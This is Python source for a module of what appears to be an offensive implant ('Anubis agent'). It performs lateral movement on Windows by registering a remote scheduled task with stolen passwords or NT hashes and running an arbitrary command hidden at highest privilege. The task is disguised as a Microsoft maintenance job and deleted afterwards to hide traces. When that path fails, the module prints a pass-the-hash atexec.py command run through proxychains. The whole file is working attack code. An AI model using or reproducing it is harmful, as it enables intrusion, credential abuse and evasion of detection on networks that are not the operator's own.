    # task_xml_ext — Anubis agent (MÉTODO da classe anubis)
    # Lateral exec via Scheduled Task XML (não Impacket / não WinRM interativo)
    # Auth: password e/ou nthash | Window: hidden|minimized|console
    # Retorno: texto status (compatível processTask)

    def task_xml_ext(
        self,
        task_id,
        target="",
        username="",
        password="",
        nthash="",
        domain="",
        command="",
        task_name="",
        delete_after=True,
        window="hidden",
        shell="cmd",
        run_level="highest",
        mode="create_run_delete",
        working_dir="",
        force=True,
        socks_port=7005,
    ):
        import os, sys, json, time, tempfile, subprocess, re

        def out(msg):
            return str(msg)

        def run(cmd, timeout=120):
            try:
                r = subprocess.run(
                    cmd,
                    capture_output=True,
                    text=True,
                    timeout=timeout,
                    shell=isinstance(cmd, str),
                )
                return r.returncode, ((r.stdout or "") + (r.stderr or "")).strip()
            except Exception as e:
                return -1, str(e)

        if sys.platform != "win32":
            return out("task_xml_ext: requer Windows (agente no pivô)")

        target = str(target or "").strip()
        username = str(username or "").strip()
        password = str(password or "")
        nthash = str(nthash or "").strip().replace(" ", "")
        domain = str(domain or "").strip()
        command = str(command or "").strip()
        task_name = str(task_name or "").strip()
        working_dir = str(working_dir or "").strip()
        window = str(window or "hidden").lower().strip()
        shell = str(shell or "cmd").lower().strip()
        run_level = str(run_level or "highest").lower().strip()
        mode = str(mode or "create_run_delete").lower().strip()
        if isinstance(delete_after, str):
            delete_after = delete_after.strip().lower() in ("1", "true", "yes", "sim")
        if isinstance(force, str):
            force = force.strip().lower() in ("1", "true", "yes", "sim")
        delete_after = bool(delete_after)
        force = bool(force)

        if not target:
            return out("[-] target obrigatorio")
        if not username:
            return out("[-] username obrigatorio")
        if not command:
            return out("[-] command obrigatorio (linha a executar no alvo)")
        if not password and not nthash:
            return out("[-] informe password e/ou nthash")
        if nthash and not password:
            # schtasks remoto nativo nao aceita NT hash — tentativa via abordagem alternativa
            pass

        # normaliza hash
        if nthash:
            if ":" in nthash:
                parts = nthash.split(":")
                nthash = parts[-1].strip()
            if not re.fullmatch(r"[0-9a-fA-F]{32}", nthash):
                return out("[-] nthash invalido: 32 hex (NT) ou LM:NT")

        if not task_name:
            task_name = "Microsoft\\Windows\\Maintenance\\ConfigSync_%s" % int(time.time() % 100000)

        # user no formato para schtasks
        if domain and domain not in (".", "WORKGROUP") and "\\" not in username and "@" not in username:
            user_sch = "%s\\%s" % (domain, username)
            user_local_flag = False
        else:
            # conta local no alvo
            user_sch = username if "\\" in username else username
            user_local_flag = True

        # ── monta comando com window / shell ─────────────────────────────────
        def wrap_command(cmd, win, sh):
            cmd = cmd.strip()
            if sh == "raw":
                return cmd
            if sh == "powershell" or sh == "ps":
                # -WindowStyle conforme window
                ws = "Hidden" if win == "hidden" else ("Minimized" if win == "minimized" else "Normal")
                # Escape aspas simples para -Command
                inner = cmd.replace("'", "''")
                return (
                    "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle %s "
                    "-Command \"%s\"" % (ws, cmd.replace('"', '\\"'))
                )
            # cmd
            if win == "hidden":
                # start /B desacopla; schtasks ja e background — ainda assim evita janela
                return "cmd.exe /c %s" % cmd
            if win == "minimized":
                return "cmd.exe /c start /MIN \"\" cmd /c %s" % cmd
            # console
            return "cmd.exe /c %s" % cmd

        tr_cmd = wrap_command(command, window, shell)

        # XML Scheduled Task (v2)
        # RunLevel: HighestAvailable | LeastPrivilege
        rl = "HighestAvailable" if run_level in ("highest", "admin", "high") else "LeastPrivilege"
        # Hidden
        allow_start = "true"
        # LogonType: Password se tiver password; InteractiveToken nao serve remoto tipico
        # Para remoto com /U /P o schtasks injeta credencial

        xml_body = """<?xml version="1.0" encoding="UTF-16"?>
    <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
      <RegistrationData>
        <Description>System maintenance configuration sync</Description>
      </RegistrationData>
      <Triggers>
        <TimeTrigger>
          <StartBoundary>2000-01-01T00:00:00</StartBoundary>
          <Enabled>true</Enabled>
        </TimeTrigger>
      </Triggers>
      <Principals>
        <Principal id="Author">
          <UserId>{user}</UserId>
          <LogonType>Password</LogonType>
          <RunLevel>{rl}</RunLevel>
        </Principal>
      </Principals>
      <Settings>
        <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
        <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
        <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
        <AllowHardTerminate>true</AllowHardTerminate>
        <StartWhenAvailable>true</StartWhenAvailable>
        <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
        <AllowStartOnDemand>true</AllowStartOnDemand>
        <Enabled>true</Enabled>
        <Hidden>{hidden}</Hidden>
        <RunOnlyIfIdle>false</RunOnlyIfIdle>
        <WakeToRun>false</WakeToRun>
        <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>
        <Priority>7</Priority>
      </Settings>
      <Actions Context="Author">
        <Exec>
          <Command>{exe}</Command>
          <Arguments>{args}</Arguments>
          {workdir}
        </Exec>
      </Actions>
    </Task>
    """.format(
            user=user_sch.replace("&", "&amp;"),
            rl=rl,
            hidden="true" if window == "hidden" else "false",
            exe="cmd.exe",
            args="/c " + tr_cmd.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;")
            if shell != "raw"
            else tr_cmd.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;"),
            workdir=("<WorkingDirectory>%s</WorkingDirectory>" % working_dir.replace("&", "&amp;"))
            if working_dir
            else "",
        )

        # Para shell raw, XML Actions deve separar command/args se possivel — simplifica: cmd /c
        if shell == "raw":
            # tenta split primeiro token
            parts = tr_cmd.split(" ", 1)
            exe_xml = parts[0]
            args_xml = parts[1] if len(parts) > 1 else ""
            xml_body = """<?xml version="1.0" encoding="UTF-16"?>
    <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
      <Triggers>
        <TimeTrigger>
          <StartBoundary>2000-01-01T00:00:00</StartBoundary>
          <Enabled>true</Enabled>
        </TimeTrigger>
      </Triggers>
      <Principals>
        <Principal id="Author">
          <UserId>{user}</UserId>
          <LogonType>Password</LogonType>
          <RunLevel>{rl}</RunLevel>
        </Principal>
      </Principals>
      <Settings>
        <AllowStartOnDemand>true</AllowStartOnDemand>
        <Enabled>true</Enabled>
        <Hidden>{hidden}</Hidden>
        <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>
      </Settings>
      <Actions Context="Author">
        <Exec>
          <Command>{exe}</Command>
          <Arguments>{args}</Arguments>
          {workdir}
        </Exec>
      </Actions>
    </Task>
    """.format(
                user=user_sch.replace("&", "&amp;"),
                rl=rl,
                hidden="true" if window == "hidden" else "false",
                exe=exe_xml.replace("&", "&amp;"),
                args=args_xml.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;"),
                workdir=("<WorkingDirectory>%s</WorkingDirectory>" % working_dir.replace("&", "&amp;"))
                if working_dir
                else "",
            )

        # grava XML local (UTF-16 LE com BOM — schtasks /XML espera)
        tmp_dir = tempfile.gettempdir()
        xml_path = os.path.join(tmp_dir, "tsk_%s.xml" % int(time.time()))
        try:
            with open(xml_path, "w", encoding="utf-16") as fh:
                fh.write(xml_body)
        except Exception as e:
            return out("[-] falha ao gravar XML: %s" % e)

        lines = []
        lines.append("[*] task_xml_ext target=%s user=%s window=%s shell=%s mode=%s" % (
            target, user_sch, window, shell, mode))
        lines.append("[*] task_name=%s" % task_name)
        lines.append("[*] command=%s" % command[:200])

        # ── Auth: password (schtasks nativo remoto) ──────────────────────────
        def schtasks_remote(args_list):
            base = ["schtasks"] + args_list + ["/S", target, "/U", user_sch]
            if password:
                base += ["/P", password]
            return run(base, timeout=90)

        auth_mode = "password" if password else "nthash"
        lines.append("[*] auth=%s" % auth_mode)

        if password:
            if mode in ("create_run_delete", "create_run", "create_only"):
                create_args = ["/Create", "/TN", task_name, "/XML", xml_path, "/F"] if force else [
                    "/Create", "/TN", task_name, "/XML", xml_path
                ]
                rc, msg = schtasks_remote(create_args)
                lines.append("[create] rc=%s %s" % (rc, msg[:500] if msg else ""))
                if rc != 0 and "ERROR" in (msg or "").upper() and "exists" not in (msg or "").lower():
                    # fallback sem XML: /TR /SC ONCE
                    tr = tr_cmd
                    fb = ["/Create", "/TN", task_name, "/TR", tr, "/SC", "ONCE", "/ST", "00:00", "/SD", "01/01/2000", "/F"]
                    if run_level in ("highest", "admin", "high"):
                        fb += ["/RL", "HIGHEST"]
                    rc2, msg2 = schtasks_remote(fb)
                    lines.append("[create-fallback /TR] rc=%s %s" % (rc2, msg2[:500] if msg2 else ""))
                    if rc2 != 0:
                        try:
                            os.remove(xml_path)
                        except OSError:
                            pass
                        return out("\n".join(lines + ["[-] create falhou"]))

            if mode in ("create_run_delete", "create_run", "run_only"):
                rc, msg = schtasks_remote(["/Run", "/TN", task_name])
                lines.append("[run] rc=%s %s" % (rc, msg[:400] if msg else ""))

            if mode in ("create_run_delete",) or delete_after:
                time.sleep(2)
                rc, msg = schtasks_remote(["/Delete", "/TN", task_name, "/F"])
                lines.append("[delete] rc=%s %s" % (rc, msg[:300] if msg else ""))

            try:
                os.remove(xml_path)
            except OSError:
                pass
            lines.append("[+] concluido (password/schtasks remoto)")
            return out("\n".join(lines))

        # ── Auth: nthash apenas ──────────────────────────────────────────────
        # schtasks /P nao aceita hash. Estrategias:
        # 1) Se o agente ja roda como SYSTEM/admin no pivô, tenta schtasks /S sem /P
        #    (só funciona com credencial delegada/trust — raro)
        # 2) Monta comando one-shot via WMI Win32_Process (Connect com... precisa senha)
        # 3) Retorna pacote operacional: use password OU rode atexec no Kali com hash
        # 4) Tenta 'sc' / remote — sem hash
        #
        # Amplitude: tenta COM Schedule.Service local nao aplica ao remoto com hash.
        # Implementacao: gerar XML + instrucao + tentativa schtasks /S sem senha (cred atual)

        lines.append("[!] nthash sem password: schtasks remoto nativo NAO autentica com NT hash")
        lines.append("[*] tentando schtasks /S com token atual do processo (sem /P)...")
        rc, msg = run(
            ["schtasks", "/Create", "/S", target, "/TN", task_name, "/XML", xml_path, "/F"],
            timeout=90,
        )
        lines.append("[create-as-self] rc=%s %s" % (rc, msg[:500] if msg else ""))
        if rc == 0:
            rc2, msg2 = run(["schtasks", "/Run", "/S", target, "/TN", task_name], timeout=60)
            lines.append("[run-as-self] rc=%s %s" % (rc2, msg2[:400] if msg2 else ""))
            if delete_after:
                time.sleep(2)
                run(["schtasks", "/Delete", "/S", target, "/TN", task_name, "/F"], timeout=60)
            try:
                os.remove(xml_path)
            except OSError:
                pass
            lines.append("[+] task registrada com credencial do processo atual")
            return out("\n".join(lines))

        # Fallback operacional: escrever script helper para o operador (Kali atexec)
        helper = (
            "\n[*] Fallback com hash (Kali / SOCKS), fora do WinRM interativo:\n"
            "  proxychains atexec.py -hashes :%s '%s/%s@%s' '%s'\n"
            "  # local account:\n"
            "  proxychains atexec.py -hashes :%s './%s@%s' '%s'\n"
            % (
                nthash,
                domain or "DOMAIN",
                username,
                target,
                command.replace("'", "'\\''"),
                nthash,
                username,
                target,
                command.replace("'", "'\\''"),
            )
        )
        lines.append(helper)
        lines.append("[*] Preferivel: reenviar task com password OU usar GIAAD+hash no atexec")
        lines.append("[*] Opcao agent: winrm_ext com nthash para one-shot schtasks *no alvo* (ainda WinRM)")
        try:
            os.remove(xml_path)
        except OSError:
            pass
        return out("\n".join(lines))
